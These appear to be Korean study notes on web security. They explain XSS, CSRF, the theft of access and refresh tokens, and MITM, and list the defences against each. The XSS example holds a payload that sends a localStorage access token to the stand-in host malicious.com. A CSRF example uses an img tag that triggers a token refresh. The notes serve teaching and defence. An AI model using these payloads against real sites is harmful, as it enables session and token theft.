XSS (Cross-Site Scripting)

XSS는 "사이트 간 스크립팅" 공격으로, 웹 애플리케이션의 입력 처리 취약점을 이용해 악성 스크립트를 주입하는 방식이다

동작 원리

  1. 공격자가 B 사이트의 취약점을 찾아 악성 스크립트를 삽입함(예: 댓글, 검색 필드 등).
  2. 삽입된 스크립트가 다른 사용자에게 제공될 때 브라우저에서 실행됨.
  3. 스크립트는 사용자의 세션 쿠키 탈취, 악성 웹사이트로 리다이렉션, 또는 악성 행동 수행 가능.

XSS의 유형

  • Stored XSS (저장형): 서버에 악성 스크립트가 저장되어 다수의 사용자에게 전달됨.
  • Reflected XSS (반사형): 요청 시 악성 스크립트가 포함되고 서버가 이를 그대로 반사해 사용자 브라우저에서 실행됨.
  • DOM-based XSS: 클라이언트 측 JavaScript의 DOM 조작 취약점을 이용한 공격.

피해

  • 세션 쿠키 탈취로 계정 탈취.
  • 사용자에게 악성 사이트로 리다이렉션.
  • UI 조작으로 데이터 탈취.

방어 방법

  • 입력값 검증: HTML, JavaScript, CSS 코드 필터링(화이트리스트 기반).
  • 출력값 인코딩: HTML, URL, JavaScript로 출력될 데이터를 안전하게 인코딩.
  • Content Security Policy (CSP): 악성 스크립트 실행 제한.
  • HTTPOnly 쿠키 설정: 자바스크립트로 쿠키 접근 차단.

CSRF (Cross-Site Request Forgery)

CSRF는 "사이트 간 요청 위조" 공격으로, 사용자가 자신도 모르게 공격자가 의도한 요청을 서버로 보내게 만드는 기법이다.

동작 원리

  1. 사용자가 A 사이트에 로그인해 세션을 유지하고 있음
  2. 공격자가 사용자를 속여 악성 스크립트나 링크(예: 이메일, 악성 웹사이트 등)에 접속하게 만듬
  3. 사용자가 링크를 클릭하면 A 사이트로 유효한 요청이 전송됨(예: 계좌 이체, 데이터 변경 등)
  4. 서버는 요청이 사용자의 세션을 통해 왔기 때문에 이를 신뢰하고 실행함

피해

  • 사용자의 계정에서 원치 않는 작업 실행(송금, 설정 변경 등).
  • 피해자가 요청을 보낸 것처럼 위장되므로 피해자는 공격 사실을 알아채기 어려움.

방어 방법

  • CSRF 토큰: 각 요청에 고유한 토큰을 포함해 서버에서 검증.
  • Referer 헤더 확인: 요청의 출처를 확인해 신뢰할 수 없는 도메인 차단.
  • SameSite 쿠키 설정: 동일한 도메인에서만 쿠키를 사용할 수 있도록 제한.

1. Access Token

Access Token은 주로 클라이언트가 서버에 API 요청을 보낼 때 권한을 증명하는 데 사용돼. 유효 기간이 짧지만, 공격자가 이를 탈취하면 심각한 문제가 발생할 수 있어.

취약한 공격

  1. 토큰 탈취 (Token Theft)
    • 공격자가 네트워크를 가로채거나 (MITM 공격), 브라우저의 취약점을 이용해 Access Token을 훔침.
    • 탈취 후, 공격자가 권한 있는 API 요청을 보낼 수 있음.
  2. XSS (Cross-Site Scripting)
    • 브라우저에서 Access Token을 저장할 때, XSS 공격으로 JavaScript를 통해 탈취 가능.
    • 예: localStorage, sessionStorage에 저장된 토큰을 공격자가 악성 스크립트로 접근.
  3. Replay Attack
    • 공격자가 탈취한 Access Token을 반복적으로 사용해 API 요청을 보내는 공격.
  4. 토큰 노출 (Token Exposure)
    • URL 쿼리 파라미터에 Access Token을 포함하면, 로그나 브라우저 히스토리 등을 통해 토큰이 노출될 위험이 있음.

방어 방법

  • 토큰은 HTTPOnly 및 Secure 쿠키에 저장해 XSS 및 XSRF에 대비.
  • HTTPS를 사용해 네트워크 전송 암호화.
  • 짧은 만료 시간 설정(예: 5분).
  • Access Token을 사용할 때 IP나 User-Agent를 확인해 세션 일관성을 유지.

2. Refresh Token

Refresh Token은 만료된 Access Token을 갱신하는 데 사용돼. 유효 기간이 길고 민감한 작업에 사용되기 때문에, 탈취 시 더 큰 위험을 초래할 수 있어.

취약한 공격

  1. 탈취 (Token Theft)
    • Refresh Token은 유효 기간이 길기 때문에, 탈취되면 더 오랜 기간 사용될 수 있음.
    • 서버의 보안 설정 미흡으로 노출될 가능성도 존재.
  2. CSRF (Cross-Site Request Forgery)
    • Refresh Token 요청에 CSRF 취약점이 존재하면, 공격자가 사용자의 Refresh Token을 악의적으로 사용할 수 있음.
  3. 토큰 재사용 (Replay Attack)
    • 공격자가 Refresh Token을 탈취 후, 이를 반복적으로 사용해 Access Token을 지속적으로 갱신.
  4. 권한 승격 (Privilege Escalation)
    • Refresh Token 탈취 후 공격자가 이를 활용해 권한을 상승시키는 요청을 서버에 보낼 수 있음.

방어 방법

  • Refresh Token은 HTTPOnly 및 Secure 쿠키에 저장.
  • Refresh Token 사용 시 IP 및 디바이스 정보를 바탕으로 추가 검증.
  • Refresh Token을 한 번 사용 후 폐기(One-Time Use)하고 새로운 Refresh Token을 발급.
  • CSRF 방지를 위해 CSRF 토큰 및 SameSite 쿠키를 활용.

1. Access Token 탈취 (XSS를 활용한 사례)

Access Token이 브라우저의 localStorage에 저장된 경우, XSS 공격을 통해 악성 스크립트가 이를 탈취할 수 있어.

취약한 코드

javascript
코드 복사
// 로그인 후 Access Token을 localStorage에 저장
localStorage.setItem('accessToken', 'eyJhbGci...'); // 토큰 저장

// 어딘가에서 사용자 입력값을 그대로 innerHTML로 출력
const userInput = "<script>fetch('http://malicious.com?token=' + localStorage.getItem('accessToken'))</script>";
document.getElementById("output").innerHTML = userInput; // XSS 취약점

탈취 과정

  1. 사용자가 악성 스크립트가 포함된 입력값을 제출.
  2. 서버에서 입력값을 제대로 검증하지 않고 그대로 클라이언트로 전송.
  3. 브라우저에서 <script> 태그가 실행되고 localStorage에 접근해 Access Token을 탈취.
  4. 악성 서버로 토큰이 전송됨.

방어 방법

  • HTTPOnly 쿠키 사용: JavaScript로 접근할 수 없도록 설정.
  • 입력값 검증: HTML, JavaScript 코드가 실행되지 않도록 터링.
  • CSP(Content Security Policy): 스크립트 출처를 제한.

2. Refresh Token 탈취 (CSRF를 활용한 사례)

Refresh Token이 CSRF 공격에 노출되면 공격자가 사용자의 Refresh Token을 악용해 Access Token을 갱신할 수 있어.

취약한 코드

// Refresh Token 요청을 자동으로 전송하는 취약한 API
fetch('https://api.example.com/auth/refresh', {
  method: 'POST',
  credentials: 'include', // 쿠키 자동 전송
});

탈취 과정

  1. 사용자가 CSRF 공격 페이지에 접속.
  2. 공격 페이지가 자동으로 API 요청을 보냄: 
    
<img src="https://api.example.com/auth/refresh">
  3. 브라우저는 쿠키를 포함해 요청을 전송하고, 서버는 요청을 신뢰해 Access Token을 갱신.
  4. 갱신된 Access Token이 악의적으로 사용됨.

방어 방법

  • CSRF 토큰 사용: 요청마다 고유한 토큰을 포함하고 이를 서버에서 검증.
  • SameSite 쿠키 설정: 다른 도메인에서 쿠키를 전송하지 못하도록 설정.
  • Referer 헤더 확인: 요청 출처를 검증.

3. MITM(Man-In-The-Middle)을 통한 토큰 탈취

HTTPS가 아닌 HTTP를 사용할 경우, 네트워크 상에서 Access Token이나 Refresh Token이 탈취될 수 있어.

취약한 요청 코드

// HTTP를 통해 API 요청
fetch('http://api.example.com/auth', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer eyJhbGci...' // Access Token 포함
  }
});

탈취 과정

  1. 공격자가 네트워크 트래픽을 가로챔(예: 공용 Wi-Fi).
  2. HTTP 요청에 포함된 Authorization 헤더에서 Access Token을 탈취.
  3. 공격자는 탈취한 토큰으로 권한 있는 API 요청을 수행.

방어 방법

  • HTTPS 사용: 트래픽 암호화를 통해 탈취 방지.
  • 만료 시간 단축: Access Token을 짧은 유효 기간으로 설정.
  • IP 및 User-Agent 검증: 요청의 일관성을 확인.
